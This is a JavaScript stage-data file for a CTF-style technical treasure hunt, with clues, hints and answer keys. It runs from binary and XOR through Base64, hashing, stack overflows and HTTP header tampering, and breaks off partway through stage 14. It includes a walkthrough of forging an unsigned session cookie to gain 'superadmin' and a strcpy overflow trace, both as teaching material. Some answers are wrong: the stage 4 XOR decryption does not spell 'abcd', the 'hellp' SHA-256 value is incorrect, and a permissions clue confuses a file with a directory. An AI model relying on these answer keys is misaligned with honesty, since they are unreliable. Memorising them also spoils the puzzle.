/**
 * THE ARCHIVE — Stage Data (v4 — Technical Treasure Hunt)
 * SECURITY: This file NEVER reaches the client.
 *
 * Clue design principles:
 *  - Tier I hints: point toward method, not answer
 *  - Tier II hints: give partial nudge only
 *  - Tier III+ hints: conceptual direction, no working shown
 *  - Never give the final computation in a hint
 *  - Clues should feel like puzzles, not tutorials
 */

'use strict';

function norm(s) {
  return String(s).toLowerCase().trim().replace(/\s+/g, ' ');
}

function makeFlag(word) {
  return `FLAG{${word.toUpperCase()}}`;
}

const STAGES = [

  /* ═══════════════════════════════════════════
     TIER I — INITIATION (Stages 1–5)
     Binary, hex, ASCII, XOR, checksums.
     ═══════════════════════════════════════════ */

  {
    id: 1, name: "Signal Zero", tier: "TIER I — INITIATION",
    flag: makeFlag("BITS_AND_BYTES"),
    clues: [
      {
        id: 1,
        text: `The Archive speaks in machine language.

A signal arrives as 8 bits:  1 0 1 1 0 1 0 0

Each bit position (right to left) is a power of 2:
  Rightmost bit = 2⁰ = 1
  Next bit      = 2¹ = 2
  Next bit      = 2² = 4
  ... and so on up to 2⁷ = 128

The leftmost bit in the string above has position value 128.

Add the positional values of every bit that is 1.

What decimal number does 10110100 represent?`,
        answer: norm("180"),
        hint: "Identify which positions hold a 1, then look up their power-of-2 value. There are four 1s in this signal."
      },
      {
        id: 2,
        text: `Your result from clue 1 needs to be expressed in hexadecimal.

Hexadecimal is base 16. When a decimal number exceeds 15,
divide it by 16 — the quotient and remainder give you the two hex digits.

Digits above 9 use letters: 10=A, 11=B, 12=C, 13=D, 14=E, 15=F.

Convert your clue 1 answer to two-digit hex.`,
        answer: norm("b4"),
        hint: "Divide your number by 16. The quotient is one hex digit, the remainder is the other. Remember letters represent values above 9."
      },
      {
        id: 3,
        text: `A message is hidden in this hex string:

  42 49 54 53

Each hex pair is one ASCII character.
Convert: hex → decimal → letter.

ASCII reference (partial):
  65=A  66=B  67=C  68=D  69=E  70=F  71=G  72=H
  73=I  74=J  75=K  76=L  77=M  78=N  79=O  80=P
  81=Q  82=R  83=S  84=T  85=U  86=V  87=W  88=X

What four-letter word do the bytes spell?`,
        answer: norm("bits"),
        hint: "Start with 0x42. Convert to decimal first, then use the ASCII table to find the letter."
      },
      {
        id: 4,
        text: `Apply a bitwise AND operation column by column:

  10110110
  AND
  00001111
  ________

Rule: output is 1 only when BOTH input bits are 1.
Everything else produces 0.

Work through all 8 columns. Convert the 8-bit result to decimal.

Submit the decimal value only.`,
        answer: norm("6"),
        hint: "Notice the second operand: 00001111. Think about what AND-ing with 0 always produces, and what the last four bits of the first operand are."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 1

You've converted binary to decimal, decimal to hex,
hex to ASCII, and applied a bitwise operation.

The flag combines the word you decoded in clue 3
with the word for the unit that contains 8 of whatever you decoded.

FLAG{WORD_AND_WORD}`,
        answer: norm("flag{bits_and_bytes}"),
        hint: "Your clue 3 word was the smaller unit. Eight of them make the larger unit. What's the larger unit called?"
      }
    ]
  },

  {
    id: 2, name: "Base Camp", tier: "TIER I — INITIATION",
    flag: makeFlag("OCTAL_IS_POWER"),
    clues: [
      {
        id: 1,
        text: `Computers use multiple number bases.

Octal is base 8 — it uses only the digits 0 through 7.
Each position is a power of 8.

Convert octal 17 (written 0o17) to decimal:
  The left digit has positional value 8¹
  The right digit has positional value 8⁰

What decimal number is 0o17?`,
        answer: norm("15"),
        hint: "First digit × 8, second digit × 1. Add them."
      },
      {
        id: 2,
        text: `Now go the other direction. Convert decimal 64 to octal.

Method: divide by 8 repeatedly until quotient is 0.
Collect the remainders. Read them bottom to top.

What is 64 in octal?`,
        answer: norm("100"),
        hint: "64 ÷ 8 = 8 remainder 0. Keep dividing. Notice anything special about the result?"
      },
      {
        id: 3,
        text: `Linux uses octal for file permissions.

Each permission group (owner, group, other) uses three bits: r, w, x.
  r = read  = 4
  w = write = 2
  x = execute = 1
Add the values of the permissions that are set.

Convert this permission string to its three-digit octal number:

  rw-rw-r--`,
        answer: norm("664"),
        hint: "Calculate each group of three characters separately. A dash means that permission is 0."
      },
      {
        id: 4,
        text: `A file has permission 0o755.

Breaking it down:
  7 = owner
  5 = group
  5 = other

The OTHER user (not owner, not group) wants to CREATE a new file inside this directory.
Creating files requires write permission.

Can the OTHER user write to this file?

Answer yes or no.`,
        answer: norm("no"),
        hint: "Convert the 'other' octal digit back to rwx. Does write appear?"
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 2

File permissions control who can read, write, and execute.
Without understanding octal, you cannot reason about Linux security.

The flag: two words describing what octal gives you over a system.

FLAG{OCTAL_IS_WORD}`,
        answer: norm("flag{octal_is_power}"),
        hint: "What do you gain when you can read and control all permission numbers on a system?"
      }
    ]
  },

  {
    id: 3, name: "The ASCII Maze", tier: "TIER I — INITIATION",
    flag: makeFlag("ENCODE_EVERYTHING"),
    clues: [
      {
        id: 1,
        text: `A message is stored as decimal ASCII values:

  69  78  67  79  68  69

ASCII maps numbers to characters.
Every printable character has a code between 32 and 126.
Uppercase A starts at 65.

What six-letter word do those numbers spell?`,
        answer: norm("encode"),
        hint: "A=65, B=66, C=67... count forward from A to find each letter."
      },
      {
        id: 2,
        text: `There is a precise relationship between uppercase and lowercase in ASCII.

Every uppercase letter and its lowercase version differ by exactly 32.
A=65, a=97. B=66, b=98.

Add 32 to every character in ENCODE.
What do you get?`,
        answer: norm("encode"),
        hint: "Adding 32 to an uppercase letter gives its lowercase version. The word stays the same — only the case changes."
      },
      {
        id: 3,
        text: `Why does adding 32 convert uppercase to lowercase?

In binary, A = 01000001 and a = 01100001.
The difference is exactly one bit — bit 5 (value 32).

What is the decimal ASCII value of the space character?
(It sits at position 32 in the ASCII table — the same value
 that separates uppercase from lowercase.)`,
        answer: norm("32"),
        hint: "The space character's decimal value is the same number that converts uppercase to lowercase. What number is that?"
      },
      {
        id: 4,
        text: `A string was stored with an off-by-one obfuscation:
each ASCII value had 1 subtracted before storing.

Stored values:
  68  86  69  82  89  84  72  73  78  71

Add 1 to each value, then decode to ASCII.

What ten-letter word do you get?`,
        answer: norm("everything"),
        hint: "Restore the original values first (add 1), then map each to a letter. The result is a common English word."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 3

ASCII is the foundation layer that all text computing builds on.

The flag: what ASCII is designed to do with any character.

FLAG{WORD_WORD}`,
        answer: norm("flag{encode_everything}"),
        hint: "Think about ASCII's purpose. It takes any character and converts it to a number — what verb describes that process?"
      }
    ]
  },

  {
    id: 4, name: "The XOR Door", tier: "TIER I — INITIATION",
    flag: makeFlag("XOR_IS_MAGIC"),
    clues: [
      {
        id: 1,
        text: `XOR (exclusive OR) is a fundamental bitwise operation.

It outputs 1 only when the two input bits are DIFFERENT.

  0 XOR 0 = 0  (same → 0)
  0 XOR 1 = 1  (different → 1)
  1 XOR 0 = 1  (different → 1)
  1 XOR 1 = 0  (same → 0)

Compute: 1010 XOR 1100

Work through each bit pair left to right.`,
        answer: norm("0110"),
        hint: "Compare each pair of bits: are they the same or different? Different = 1, Same = 0."
      },
      {
        id: 2,
        text: `XOR has a remarkable property: applying it twice with the same key
returns the original value. A XOR B XOR B = A.

This makes XOR a perfect encryption primitive.

Encrypt this byte using XOR with key byte 53:
  Plaintext:  01001000  (ASCII 72 = 'H')
  Key:        00110101  (decimal 53)

XOR each bit pair. What is the 8-bit ciphertext?`,
        answer: norm("01111101"),
        hint: "Apply the XOR rule to each of the 8 bit pairs in order. Remember: same bits = 0, different bits = 1."
      },
      {
        id: 3,
        text: `Your ciphertext from clue 2 was 01111101.

Now decrypt it using the same key (53) and the same XOR operation.

XOR the ciphertext with 00110101 again.

Convert the result to decimal. What number do you get?`,
        answer: norm("72"),
        hint: "XOR with the same key is its own inverse. You should get back what you started with. What was the decimal value of the original plaintext?"
      },
      {
        id: 4,
        text: `Decrypt this four-byte XOR-encrypted message.
The key byte is 42.

Ciphertext values (decimal): 107  127  120  111

For each byte: convert to 8-bit binary, XOR with 42 (00101010), convert back to decimal, then to ASCII.

You already know: 107 XOR 42 = 65 = 'A'

What four-letter word do the decrypted bytes spell?`,
        answer: norm("abcd"),
        hint: "You already have the first letter: A. Work out the remaining three bytes the same way. The result is very simple."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 4

XOR underpins:
  - Stream cipher encryption
  - RAID 5 parity calculations
  - One-time pads
  - Checksums and error detection

It encrypts and decrypts with the same operation.
No other logical operation does this.

FLAG{XOR_IS_WORD}`,
        answer: norm("flag{xor_is_magic}"),
        hint: "A single operation that encrypts and decrypts, builds RAID systems, and underlies half of computer security — what's the word for something that remarkable?"
      }
    ]
  },

  {
    id: 5, name: "The Checksum Chamber", tier: "TIER I — INITIATION",
    flag: makeFlag("VERIFY_DONT_TRUST"),
    clues: [
      {
        id: 1,
        text: `Checksums detect data corruption in transit.

A simple checksum: sum all bytes, apply modulo 256.
The result fits in a single byte (0–255).

A packet contains these bytes:
  72  101  108  108  111

Add them all together. What is the sum?`,
        answer: norm("550"),
        hint: "Add five numbers. Double-check your arithmetic — one mistake here breaks everything downstream."
      },
      {
        id: 2,
        text: `Your sum was 550. Now apply modulo 256.

Modulo gives you the remainder after division.
  550 divided by 256 = 2 remainder ?

What is 550 mod 256?`,
        answer: norm("38"),
        hint: "How many times does 256 fit into 550? Multiply 256 by that, subtract from 550."
      },
      {
        id: 3,
        text: `The receiver recalculates the checksum on arrival.

One byte was silently corrupted. The received bytes are:
  72  101  108  109  111

Recalculate: sum → mod 256.

Does the result match your original checksum of 38?

Answer yes or no.`,
        answer: norm("no"),
        hint: "Recalculate from scratch with the new values. If the checksums differ, corruption was detected."
      },
      {
        id: 4,
        text: `Compare the two byte sequences side by side:

  Original: 72  101  108  108  111
  Received: 72  101  108  109  111

One byte changed. Which position (1-indexed) was altered,
and what did it change from → to?

Submit as: position:original:received`,
        answer: norm("4:108:109"),
        hint: "Compare each position one by one. Only one value is different between the two sequences."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 5

The checksum detected corruption you couldn't see by looking.
This principle — checking data you received rather than assuming it's correct —
is fundamental to secure systems.

The mantra:

FLAG{VERIFY_WORD_WORD}`,
        answer: norm("flag{verify_dont_trust}"),
        hint: "Security engineers never assume incoming data is correct. They always verify. And they never ___."
      }
    ]
  },

  /* ═══════════════════════════════════════════
     TIER II — THE STACKS (Stages 6–10)
     Logic gates, Base64, networking, data
     structures, regex.
     ═══════════════════════════════════════════ */

  {
    id: 6, name: "The Logic Engine", tier: "TIER II — THE STACKS",
    flag: makeFlag("NAND_BUILDS_WORLDS"),
    clues: [
      {
        id: 1,
        text: `Evaluate this digital circuit step by step.

Inputs: A=1, B=0, C=1

  Step 1: X = A AND B
  Step 2: Y = X OR C
  Step 3: Z = NOT Y

AND: both must be 1 to output 1.
OR:  at least one must be 1 to output 1.
NOT: flips the bit.

What is Z?`,
        answer: norm("0"),
        hint: "Evaluate each step in order. The output of one step becomes input to the next."
      },
      {
        id: 2,
        text: `NAND gate: NOT(A AND B).
It outputs 0 only when BOTH inputs are 1. In all other cases, it outputs 1.

Complete the NAND truth table for all four input combinations:
  A=0, B=0 → ?
  A=0, B=1 → ?
  A=1, B=0 → ?
  A=1, B=1 → ?

Submit all four results as one continuous string (no spaces or commas).`,
        answer: norm("1110"),
        hint: "Only one combination produces a 0 output from NAND. Which inputs would make AND output 1, then get flipped by NOT?"
      },
      {
        id: 3,
        text: `NAND is a universal gate — every other logic gate can be built from NANDs alone.

To build a NOT gate using NAND, connect both inputs to the same signal:
  NOT(A) = A NAND A  →  requires 1 NAND gate

To build an AND gate: you need NOT(NAND(A,B)), since NAND already gives NOT-AND.

Minimum NAND gates to implement a two-input AND gate?`,
        answer: norm("2"),
        hint: "AND = NOT(NAND). You need one gate for NAND, and one more to invert the result."
      },
      {
        id: 4,
        text: `A half adder adds two single bits.

  Sum   = A XOR B
  Carry = A AND B

Given inputs A=1, B=1:

  When both inputs are 1, what does XOR produce?
  When both inputs are 1, what does AND produce?

Submit as sum:carry`,
        answer: norm("0:1"),
        hint: "XOR outputs 1 when bits differ. What happens when they're the same? AND requires both to be 1."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 6

Every CPU, GPU, and microcontroller ever built is composed
of billions of logic gates — predominantly NAND.

From one primitive gate, all of computation is derived.

The flag celebrates what NAND can do when replicated at scale.

FLAG{NAND_WORD_WORD}`,
        answer: norm("flag{nand_builds_worlds}"),
        hint: "What does replicating a single gate billions of times, connected in clever ways, allow you to create?"
      }
    ]
  },

  {
    id: 7, name: "The Encoding Labyrinth", tier: "TIER II — THE STACKS",
    flag: makeFlag("BASE64_HIDES_DATA"),
    clues: [
      {
        id: 1,
        text: `Base64 converts binary data into printable ASCII text.
It uses 64 characters: A-Z (0–25), a-z (26–51), 0-9 (52–61), + (62), / (63).

Every 3 bytes of input become 4 Base64 characters.
Each Base64 character represents exactly 6 bits.

What is the numeric index of the character 'S' in the Base64 alphabet?
(A=0, B=1, C=2 ... Z=25, a=26 ...)`,
        answer: norm("18"),
        hint: "S is the 19th letter of the alphabet. The Base64 alphabet starts at A=0, so subtract 1."
      },
      {
        id: 2,
        text: `Decode this Base64 string.

  aGVsbG8=

You can use any of these:
  Browser console (F12 → Console): atob("aGVsbG8=")
  Python: import base64; base64.b64decode("aGVsbG8=").decode()
  Linux terminal: echo "aGVsbG8=" | base64 -d

What word does it decode to?`,
        answer: norm("hello"),
        hint: "Open your browser's developer tools (F12), go to the Console tab, and type the atob() command."
      },
      {
        id: 3,
        text: `Decode this longer Base64 payload using the same method:

  dGhlIGFyY2hpdmUgaGlkZXMgZGF0YQ==

What four-word phrase does it decode to?`,
        answer: norm("the archive hides data"),
        hint: "Use the same tool from clue 2. The payload decodes to a meaningful English phrase — four words."
      },
      {
        id: 4,
        text: `JWTs (JSON Web Tokens) use Base64URL encoding for their header and payload.
Base64URL is nearly identical to Base64 but uses - instead of + and _ instead of /.

Decode this JWT header using atob() in your browser console:

  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

You'll get a JSON object. What is the value of the "alg" field?`,
        answer: norm("hs256"),
        hint: "atob() works for this — the Base64URL special characters don't appear in this particular token. Look for the 'alg' key in the decoded JSON."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 7

Base64 is encoding, not encryption.
It converts binary to text — nothing more.
Anyone who sees a Base64 string can decode it instantly.

Yet it carries sensitive data — tokens, credentials, cookies —
hiding in plain sight because most people don't recognise it.

The flag: what Base64 actually does with your data.

FLAG{BASE64_WORD_WORD}`,
        answer: norm("flag{base64_hides_data}"),
        hint: "What is Base64 doing when it stores sensitive information inside a JWT or cookie, visible to anyone who looks?"
      }
    ]
  },

  {
    id: 8, name: "The Network Stack", tier: "TIER II — THE STACKS",
    flag: makeFlag("IP_PORT_PROTOCOL"),
    clues: [
      {
        id: 1,
        text: `An IPv4 address in binary, four octets separated by spaces:

  11000000 10101000 00000001 00101010

Convert each 8-bit group to decimal independently.
Separate the four decimal numbers with dots.

What IP address is this?`,
        answer: norm("192.168.1.42"),
        hint: "Each octet is independent. Convert each 8-bit group using positional values (128,64,32,16,8,4,2,1)."
      },
      {
        id: 2,
        text: `The IP address you decoded (192.168.x.x) belongs to a special category.

RFC 1918 designates three ranges as private — not routable on the public internet:
  10.0.0.0/8
  172.16.0.0/12
  192.168.0.0/16

A server at 8.8.8.8 receives a packet from your private IP.
If it tries to send a response directly back to 192.168.1.42:

Can 8.8.8.8 reach 192.168.1.42 without any intermediary?

Answer yes or no.`,
        answer: norm("no"),
        hint: "Private IPs exist only inside local networks. What happens when the public internet tries to route a packet to an address it has never seen?"
      },
      {
        id: 3,
        text: `Port numbers identify which service should handle a connection.

A connection is made to: 192.168.1.42:443

Port 443 is reserved for a specific protocol that wraps
standard web traffic in TLS encryption.

What application-layer protocol runs on port 443?`,
        answer: norm("https"),
        hint: "HTTP runs on 80. The secure version of HTTP runs on port 443. What's the S stand for?"
      },
      {
        id: 4,
        text: `TCP establishes connections using a three-way handshake.

Step 1: Client sends SYN with sequence number 1000.
Step 2: Server responds with SYN-ACK.
         The server's ACK number acknowledges the client's sequence number.
         ACK number = client_seq + 1

Step 3: Client sends ACK.

What acknowledgment number does the server send in step 2?`,
        answer: norm("1001"),
        hint: "The ACK number tells the sender which byte the receiver expects next. If you received up to byte 1000, which byte do you want next?"
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 8

Every network conversation is defined by three things —
which machine, which service, and which rules govern the exchange.

The flag names all three identifiers in order.

FLAG{IP_WORD_WORD}`,
        answer: norm("flag{ip_port_protocol}"),
        hint: "IP identifies the machine. Port identifies the service. What identifies the rules?"
      }
    ]
  },

  {
    id: 9, name: "The Stack and Queue", tier: "TIER II — THE STACKS",
    flag: makeFlag("LIFO_MEETS_FIFO"),
    clues: [
      {
        id: 1,
        text: `A program's call stack tracks function execution.
Stack behaviour: Last In, First Out (LIFO).

Trace these operations on an initially empty stack:
  PUSH main()
  PUSH authenticate()
  PUSH hashPassword()
  POP
  PUSH compareHash()
  POP
  POP

After all operations complete, what single function remains on top?`,
        answer: norm("main"),
        hint: "Draw it out. Each PUSH adds to the top, each POP removes from the top. Track what's there after every operation."
      },
      {
        id: 2,
        text: `A network request queue operates as First In, First Out (FIFO).

Trace on an empty queue:
  ENQUEUE request_A
  ENQUEUE request_B
  ENQUEUE request_C
  DEQUEUE
  ENQUEUE request_D
  DEQUEUE

Which two requests remain in the queue, and in what order (front to back)?

Submit as: first,second`,
        answer: norm("request_c,request_d"),
        hint: "In FIFO, whoever arrived first leaves first. After two dequeues, who is at the front?"
      },
      {
        id: 3,
        text: `A function calls itself without a stopping condition:

  function recurse(n):
    return recurse(n + 1)   // no base case

  recurse(0)

The call stack has a maximum of 5 frames before it overflows.
Each call uses exactly 1 frame.

How many times does recurse() execute before the overflow error occurs?`,
        answer: norm("5"),
        hint: "Count how many frames are pushed before the 6th call would exceed the limit. The first call is frame 1."
      },
      {
        id: 4,
        text: `A deque (double-ended queue) supports push and pop from both ends.

Starting with an empty deque, apply these operations in order:
  PUSH_FRONT X
  PUSH_BACK  Y
  PUSH_FRONT Z
  PUSH_BACK  W

Draw the state: [Z, X, Y, W] (front → back)

Then apply:
  POP_FRONT
  POP_BACK

What two elements remain, and in what order?

Submit as: front,back`,
        answer: norm("x,y"),
        hint: "After the two pops, which elements from the middle are left? Which one was closer to the front?"
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 9

Stack (LIFO) and Queue (FIFO) are opposites in ordering behaviour,
but both are essential structures in every real system.

The flag describes their relationship.

FLAG{LIFO_WORD_FIFO}`,
        answer: norm("flag{lifo_meets_fifo}"),
        hint: "What verb describes two opposing concepts coming together? LIFO ___ FIFO."
      }
    ]
  },

  {
    id: 10, name: "The Regex Engine", tier: "TIER II — THE STACKS",
    flag: makeFlag("PATTERN_MATCH_WIN"),
    clues: [
      {
        id: 1,
        text: `Regular expressions match patterns in text.

Pattern: ^[A-Z][a-z]+$

  ^ = must start here
  [A-Z] = exactly one uppercase letter
  [a-z]+ = one or more lowercase letters
  $ = must end here

Test this pattern against each string and record match (yes) or no match (no):
  "Hello"
  "hello"
  "HELLO"
  "Hello123"

Submit four answers comma-separated.`,
        answer: norm("yes,no,no,no"),
        hint: "Each string must satisfy every part of the pattern from start to end. What fails first in each non-matching case?"
      },
      {
        id: 2,
        text: `The pattern \d+ matches one or more consecutive digits.

Apply \d+ to this string:
  "user_id=4829&token=7f3kQ2&role=admin"

The pattern finds ALL consecutive digit sequences.
Letters break up a sequence — each unbroken run of digits is a separate match.

List all matches in the order they appear, comma-separated.`,
        answer: norm("4829,7,3,2"),
        hint: "Scan through the string left to right. Every time you hit a digit, collect until you hit a non-digit. How many separate groups of consecutive digits are there?"
      },
      {
        id: 3,
        text: `Parse this log line using the regex pattern below:

Log: "2024-01-15 14:32:07 ERROR [auth] Invalid token from 192.168.1.55"

Pattern: \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}

  \d{1,3} = between 1 and 3 digits
  \. = a literal dot

What substring does this pattern match in the log line?`,
        answer: norm("192.168.1.55"),
        hint: "The pattern describes a specific format that appears exactly once in this log line. What format has groups of digits separated by dots?"
      },
      {
        id: 4,
        text: `Capture groups (parentheses) extract specific parts of a match.

Pattern: password=([a-zA-Z0-9!@#]{8,})
Input:   "username=admin&password=Tr0ub4dor&session=abc123"

The character class [a-zA-Z0-9!@#] matches any alphanumeric or symbol character.
{8,} means 8 or more repetitions.

What does the capture group extract from this input?

Submit in lowercase.`,
        answer: norm("tr0ub4dor"),
        hint: "Find 'password=' in the string, then extract what follows it. The capture group stops when it hits a character not in its allowed set."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 10

Regex is a tool that either works or doesn't —
there's no partial credit when parsing real data.

The flag: three words describing the outcome when your pattern works.

FLAG{PATTERN_WORD_WORD}`,
        answer: norm("flag{pattern_match_win}"),
        hint: "When your regex pattern successfully finds what you're looking for, the three-word phrase is PATTERN, then the verb for finding something, then what you've achieved."
      }
    ]
  },

  /* ═══════════════════════════════════════════
     TIER III — RESTRICTED SECTION (Stages 11–15)
     Hashing, memory layout, HTTP internals,
     algorithms, pseudocode tracing.
     ═══════════════════════════════════════════ */

  {
    id: 11, name: "The Hash Vault", tier: "TIER III — RESTRICTED SECTION",
    flag: makeFlag("HASHES_NEVER_LIE"),
    clues: [
      {
        id: 1,
        text: `SHA-256 always produces a fixed-size output regardless of input length.

The output is 256 bits long.
There are 8 bits in 1 byte.

How many bytes is a SHA-256 hash?`,
        answer: norm("32"),
        hint: "Simple division: how many groups of 8 fit into 256?"
      },
      {
        id: 2,
        text: `The avalanche effect: changing even one character of input
produces a completely different hash output.

SHA-256 of "hello":
  2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824

SHA-256 of "hellp" (last letter changed from o to p):
  7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069

Both strings are 64 hex characters.
Compare them character by character, position by position.

How many positions contain a DIFFERENT character?`,
        answer: norm("59"),
        hint: "Go position by position — this is deliberate work. The vast majority will differ. Count the exceptions (positions that are the same) and subtract from 64."
      },
      {
        id: 3,
        text: `A database of password hashes was leaked.

One of the hashes is:
  5f4dcc3b5aa765d61d8327deb882cf99

This is an MD5 hash. MD5 is a broken algorithm —
and this particular hash is so famous in security circles
that it appears in every lesson about what NOT to store as a password.

What is the plaintext word this hash represents?

(Think: what do most people use as their first password attempt?)`,
        answer: norm("password"),
        hint: "If someone told you 'never use this word as your password,' what word would they say? That's the hash."
      },
      {
        id: 4,
        text: `Salting defeats rainbow table attacks.

Without salt: every user with password "password" gets the same hash.
An attacker cracks one hash and has cracked all of them.

With a unique random salt per user:
  stored_hash = hash(password + unique_salt)

Two users both have the password "password".
Each gets a different random salt.

Do their stored hashes match each other?
Can an attacker crack both with a single rainbow table lookup?

Submit two answers: match_answer,crackable_answer (yes or no each)`,
        answer: norm("no,no"),
        hint: "Think about what the salt does to the input before hashing. If the inputs differ, do the outputs differ?"
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 11

A hash is a fingerprint of data.
The same input always produces the same output.
Different inputs produce different outputs.
Tampering with data changes the hash.

There is no deception in a hash. It reflects exactly what went in.

The flag: three words about hash integrity.

FLAG{HASHES_WORD_WORD}`,
        answer: norm("flag{hashes_never_lie}"),
        hint: "If hashes accurately reflect the truth about data with no possibility of deception, what do they never do?"
      }
    ]
  },

  {
    id: 12, name: "The Memory Map", tier: "TIER III — RESTRICTED SECTION",
    flag: makeFlag("STACK_SMASH_FOUND"),
    clues: [
      {
        id: 1,
        text: `Process memory is divided into regions with different purposes.

Typical layout (low addresses at top, high addresses at bottom):

  TEXT   — compiled machine code (read-only)
  DATA   — global and static variables
  HEAP   — dynamically allocated memory (malloc/new)
  STACK  — function call frames (grows downward)

When a function is called, a new "frame" is pushed onto the stack.
The frame contains local variables, saved registers, and the return address.

A variable declared inside a function (e.g., char buffer[8])
lives in which memory region?`,
        answer: norm("stack"),
        hint: "It's declared inside a function call. Function calls create frames on one specific region."
      },
      {
        id: 2,
        text: `A function's stack frame looks like this (high address at top):

  [function arguments]      ← highest address in frame
  [return address]          ← where CPU goes after function returns
  [saved base pointer]
  [local buffer/variables]  ← lowest address in frame

A buffer overflow writes MORE data than a buffer can hold.
Writing past the end of a local buffer moves toward ___er addresses.

Does writing past a local buffer move toward HIGHER or LOWER addresses?`,
        answer: norm("higher"),
        hint: "Look at the frame layout. Local variables are at the lowest address. What's above them?"
      },
      {
        id: 3,
        text: `Vulnerable function:

  void login(char* input) {
    char buffer[8];           // holds 8 bytes
    strcpy(buffer, input);    // copies without checking length!
  }

If input is 16 bytes ("AAAAAAAAAAAAAAAA"):
  Bytes 1-8  fill buffer
  Bytes 9-12 overwrite saved base pointer
  Bytes 13-16 overwrite ???

What part of the stack frame do bytes 13-16 overwrite?`,
        answer: norm("return address"),
        hint: "Look at the stack frame layout from clue 2. After saved base pointer comes..."
      },
      {
        id: 4,
        text: `An attacker who controls the return address can redirect execution
to their own malicious code — a classic buffer overflow exploit.

ASLR (Address Space Layout Randomization) is a defence mechanism.

Which of these correctly describes what ASLR does?

  A) Makes the stack non-executable
  B) Randomizes where memory regions are loaded each time a program runs
  C) Checks array bounds before each access
  D) Encrypts the return address on the stack`,
        answer: norm("b"),
        hint: "The name contains the key: Address Space Layout ___ization. It randomizes something about the layout."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 12

What you traced is the attack described in
"Smashing the Stack for Fun and Profit" (Aleph One, 1996) —
one of the most influential security papers ever written.

When a security researcher discovers this vulnerability in a real program,
they have done two things: smashed the stack and ___ the vulnerability.

FLAG{STACK_WORD_WORD}`,
        answer: norm("flag{stack_smash_found}"),
        hint: "The first word is past tense of 'smash'. The second word means 'discovered' — four letters starting with F."
      }
    ]
  },

  {
    id: 13, name: "The HTTP Intercept", tier: "TIER III — RESTRICTED SECTION",
    flag: makeFlag("HEADERS_HOLD_SECRETS"),
    clues: [
      {
        id: 1,
        text: `An HTTP request was intercepted:

  POST /api/login HTTP/1.1
  Host: archive.internal
  Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=

HTTP Basic Authentication encodes credentials as:
  Base64(username:password)

The value after "Basic " is the Base64-encoded credentials.

Decode: YWRtaW46cGFzc3dvcmQxMjM=

Use atob() in your browser console.`,
        answer: norm("admin:password123"),
        hint: "The format after decoding is username:password. Use atob() in F12 console on the Base64 value."
      },
      {
        id: 2,
        text: `The server's response includes this header:

  Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==

The cookie value is Base64-encoded JSON.

Decode the cookie value to find what the server considers your identity.

What JSON object does it contain?`,
        answer: norm("{\"user\":\"admin\",\"role\":\"admin\"}"),
        hint: "Decode the Base64 string after 'session=' using atob(). It will decode to a JSON structure."
      },
      {
        id: 3,
        text: `The session cookie has NO cryptographic signature.
It's just Base64-encoded JSON. Anyone who can intercept it can modify it.

An attacker decodes the cookie, changes the role to "superadmin",
then re-encodes and replaces the cookie.

Modified JSON: {"user":"attacker","role":"superadmin"}

Encode this modified JSON back to Base64 using btoa() in browser console.

What is the resulting Base64 string?`,
        answer: norm("eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoic3VwZXJhZG1pbiJ9"),
        hint: "btoa() is the opposite of atob(). Pass the modified JSON string exactly as shown. Mind the quote characters."
      },
      {
        id: 4,
        text: `The correct fix is to sign the cookie using HMAC.

A signed cookie looks like: data.HMAC(secret_key, data)

If the attacker changes "data" without knowing the secret key,
the HMAC signature will no longer match.

Can the server detect the tampering?

Answer yes or no.`,
        answer: norm("yes"),
        hint: "The server recalculates the HMAC using its secret key and the received data. If it doesn't match the signature, what does that tell the server?"
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 13

HTTP headers carry authentication tokens, session data,
security directives, and routing information.

A security researcher examining an application
reads headers before anything else.

The flag: what headers contain that makes them so valuable to attackers.

FLAG{HEADERS_HOLD_WORD}`,
        answer: norm("flag{headers_hold_secrets}"),
        hint: "What word describes information that authentication tokens and session data have in common — the kind of information you wouldn't want an attacker to see?"
      }
    ]
  },

  {
    id: 14, name: "The Algorithm", tier: "TIER III — RESTRICTED SECTION",
    flag: makeFlag("BINARY_SEARCH_WINS"),
    clues: [
      {
        id: 1,
        text: `Binary search finds a target in a SORTED array by halving the search space each step.

Array (indices 0–9): [2, 5, 8, 12, 16, 23, 38, 45, 56, 72]
Target: 23

Trace each step:
  Step 1: mid = (0+9)÷2 = 4  →  arr[4]=16  →  23 > 16, search right half
  Step 2: mid = (5+9)÷2 = 7  →  arr[7]=45  →  23 < 45, search left half
  Step 3: mid = (5+6)÷2 = 5  →  arr[5]=23  →  Found!

How many comparisons (steps) did binary search need?`,
        answer: norm("3"),
        hint: "Each step is one comparison. Count the steps in the trace above."
      },
      {
        id: 2,
        text: `Now trace a linear search on the same array.

Array: [2, 5, 8, 12, 16, 23, 38, 45, 56, 72]
Target: 23

Linear search checks elements left to right, stopping when it finds the target.

How many comparisons does linear search need?`,
        answer: norm("6"),
        hint: "Count from the left: 2 (no), 5 (no), 8 (no)... stop when you reach 23. How many elements did you examine?"
      },
      {
        id: 3,
        text: `Binary search complexity is O(log₂ n) comparisons in the worst case.

For an array of one million elements:
  log₂(1,000,000) ≈ 19.93

The worst case is the ceiling of this value.

What is the maximum number of comparisons binary search needs
to find any element in a one-million-element sorted array?`,
        answer: norm("20"),
        hint: "The ceiling function rounds up to the nearest integer. 19.93 rounded up is..."
      },
      {
        id: 4,
        text: `Trace one complete pass of bubble sort.

Starting array: [64, 34, 25, 12, 22, 11, 90]

